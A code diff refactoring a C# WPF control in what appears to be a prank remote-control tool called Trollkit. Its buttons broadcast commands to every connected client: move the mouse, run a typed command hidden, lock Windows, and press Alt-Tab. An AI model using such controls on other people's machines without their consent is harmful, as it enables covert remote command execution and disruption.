@@ -18,13 +18,11 @@ using Trollkit_Library.Modules;
 namespace Trollkit.Windows
 {
     /// <summary>
-    /// Interaction logic for WindowsTrolls2.xaml
+    /// Interaction logic for WindowsTrolls.xaml
     /// </summary>
-    public partial class WindowsTrolls : UserControl
+    public partial class WindowsTrolls : TrollControl
     {
-        private MainWindow ParentFrame { get { return (MainWindow)Application.Current.MainWindow; } }
-        private const string Handler = "Windows";
-        public WindowsTrolls()
+        public WindowsTrolls() :base("Windows")
         {
             InitializeComponent();
         }
@@ -33,25 +31,25 @@ namespace Trollkit.Windows
         {
             string X = TbXcoordinate.Text;
             string Y = TbYcoordinate.Text;
-            TransferCommandObject returnObject = new TransferCommandObject { Command = "MousePosition", Handler = Handler, Value = $"{X},{Y}"};
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "MousePosition", Handler = GetHandler(), Value = $"{X},{Y}"};
             ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
         }
 
         private void BtnGo_Click(object sender, RoutedEventArgs e)
         {
-            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = Handler, Value = $"{TbComammand.Text},hidden"};
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = GetHandler(), Value = $"{TbComammand.Text},hidden"};
             ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
         }
 
         private void BtnLockWindows_Click(object sender, RoutedEventArgs e)
         {
-            TransferCommandObject returnObject = new TransferCommandObject { Command = "LockWindows", Handler = Handler};
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "LockWindows", Handler = GetHandler() };
             ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
         }
 
         private void BtnAltTab_Click(object sender, RoutedEventArgs e)
         {
-            TransferCommandObject returnObject = new TransferCommandObject { Command = "AltTab", Handler = Handler };
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "AltTab", Handler = GetHandler() };
             ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
         }
     }
